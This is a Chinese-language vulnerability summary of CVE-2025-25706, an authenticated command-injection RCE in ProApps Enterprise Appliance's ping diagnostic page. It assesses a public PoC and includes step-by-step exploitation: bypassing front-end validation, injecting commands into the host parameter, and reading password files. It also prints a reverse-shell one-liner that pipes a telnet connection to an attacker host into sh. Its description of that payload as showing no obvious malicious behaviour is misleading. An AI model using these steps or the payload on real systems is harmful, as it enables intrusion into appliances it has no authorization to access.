## CVE-2025-25706

**漏洞编号:** CVE-2025-25706

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** ProApps - Enterprise Appliance (FreeBSDbrasil)

**危害等级:** 高危，可导致完全系统控制，数据泄露，横向移动，恶意软件部署，以及声誉和财务损失

**影响版本:** 未知，但根据代码描述，在某个基于FreeBSD Unix, NGINX, PHP 7.3.18, Jquery UI 1.6 | Jquery 1.2.6 的 ProApps Enterprise Appliance 环境中

**利用条件:** 需要身份验证，且用户属于'Status'权限组，并具有'Modified'权限。需要绕过前端输入验证。目标系统需使用FreeBSD Unix环境。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-25706是一个存在于ProApps Enterprise Appliance的远程代码执行漏洞。该漏洞位于`sta_rede.diagnostico_ping`页面，允许已认证的攻击者通过在ping命令的host参数中注入操作系统命令来执行任意代码。攻击者需要属于'Status'权限组并拥有'Modified'权限。漏洞利用需要绕过前端的输入验证，通过网络代理发送恶意构造的POST请求。攻击者可以使用命令连接符（如`;`、`&&`或`|`）在`host`参数中附加恶意命令。例如，攻击者可以读取敏感文件（如`/etc/passwd`或`/etc/master.passwd`）或获取反向shell。

**有效性评估：**

提供的POC代码看起来是有效的。它详细描述了漏洞的利用步骤，包括如何构造恶意的POST请求以及如何绕过前端的输入验证。给出的反向shell POC也提供了一种可行的攻击方法。

**投毒风险评估：**

虽然总体漏洞描述清晰，利用方式明确，但是reverse shell的payload存在一定的风险。

`TF=$(mktemp -u);mkfifo $TF && telnet $attacker.ip $attacker.port 0<$TF | sh 1>$TF`

这段代码的功能是创建一个命名管道，然后使用telnet连接到攻击者的IP和端口，并将shell的输入输出重定向到该管道。虽然这段代码本身没有明显的恶意行为，但如果攻击者的服务器被攻陷，或者攻击者故意提供恶意的payload，那么这段代码可能会被用来执行恶意操作。

考虑到代码的复杂性和潜在的风险，我们将投毒风险评估为10%。

**漏洞利用方式：**

1.  **身份验证：** 首先，攻击者需要通过身份验证，获得访问`sta_rede.diagnostico_ping`页面的权限。
2.  **权限验证：** 攻击者必须属于'Status'权限组并拥有'Modified'权限。
3.  **绕过前端验证：** 由于应用程序只在前端进行输入验证，攻击者需要使用网络代理（如Burp Suite）拦截并修改POST请求，绕过前端验证。
4.  **构造恶意POST请求：** 攻击者构造一个POST请求，在`host`参数中注入操作系统命令。可以使用命令连接符（如`;`、`&&`或`|`）将ping命令与恶意命令连接起来。
5.  **发送请求：** 通过网络代理发送构造好的POST请求。
6.  **执行恶意命令：** 服务器执行ping命令以及注入的恶意命令，从而实现远程代码执行。
7.  **反向Shell (PoC)：** 使用提供的反向shell命令，连接到攻击者的服务器，获得shell访问权限。

**项目地址:** [Cotherm/CVE-2025-25706](https://github.com/Cotherm/CVE-2025-25706)

**漏洞详情:** [CVE-2025-25706](https://nvd.nist.gov/vuln/detail/CVE-2025-25706)